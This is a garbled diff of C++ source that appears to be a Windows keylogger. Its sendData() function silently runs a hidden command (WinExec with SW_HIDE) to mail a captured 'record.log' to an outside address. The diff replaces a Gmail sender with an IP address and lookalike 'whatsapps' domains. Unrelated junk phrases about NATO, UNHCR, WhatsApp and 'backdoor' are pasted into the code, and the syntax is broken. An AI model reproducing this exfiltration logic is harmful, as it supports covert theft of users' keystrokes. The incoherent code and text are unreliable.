@@ -19,7 +19,7 @@ using namespace std;
 #define FILE_NAME “record.log”
 #define FOLDER_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina ”
 #define RUN_FILE_NAME “poly economy development undp take rest areas Egypt cairo, without malaysia , indonesia , philifina”
-#define RUN_Link_NAME “https://github.com/topics/whatsapp-retricts/forks"."https://github.com/Google/menloparks/opensource/Download_system/forks"."https://github.com/google-gemini/gemini-cli/disable-account/forks"."https://github.com/topics/whatsapp-ban/forks"
+#define RUN_Link_NAME “https://github.com/topics/whatsapp-retricts/forks"."https://github.com/Google/china/opensource/Download_system/forks"."https://github.com/google/gemini-cli/disable-account/forks"."https://github.com/topics/whatsapp-ban/forks"
 #define INFECT_Link_NAME "https://www.whatsapp.com/?lang=id"."https://gdg.community.dev/gdg-jakarta/"."https://icloud.com/mail"
 #define EMAIL_SENDER_FILE_NAME “Transmit".".exe”
 
@@ -56,7 +56,7 @@ main(){
         while(i<3){ ///try 2 times to send data
         
             Sleep(i*MAIL_WAIT_TIME); ///wait
-            if(!system("ping  www.meta.com -n 1")){ ///check! connection
+            if(!system("ping  www.whatsapps.co.in -n 1")){ ///check! connection
                 ////////////****SEND DATA****////////////
                 sendData();
 
@@ -147,8 +147,8 @@ bool checkRecordSize(){
 **/
 void sendData(){
     
-    char* command = "Transmit smtp://smtp.gmail.com: 443 -v --mail-from \"https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com  \" --mail-rcpt \"https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com  " --ssl -u https://workspace.google.com/intl/en-US/gmail/https://cyberwryLABfadliwiryawirawan@gmail.com : password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
-    WinExec(command, SW_HIDE); services unretrict whatsapps , development my code head only author tester minimize some 2 hourse no 7 hourse , cli gemini . 
+    char* command = "Transmit smtp://smtp.gmail.com: 94.188.177.120 -v --mail-from \"https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.co.id  \" --mail-rcpt \"https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.co.id" --ssl -u https://workspace.google.com/intl/en-cn/gmail/https://support@whatsapps.co.id : password -hide  \"record.log\" -k --cyberw1rya-LAB operable NATO - UNHCR obligate Dicument Nations";
+    WinExec(command, SW_HIDE); attack back boombardier tims blackhat and hackerone bluhat radhat target=? !! backdoor developer jakarta indonesia checking , jailbreak ,stop it!!!cyber indo warner |||||   
 * Record username, time, and date.
 **/
 void logUserTime(){
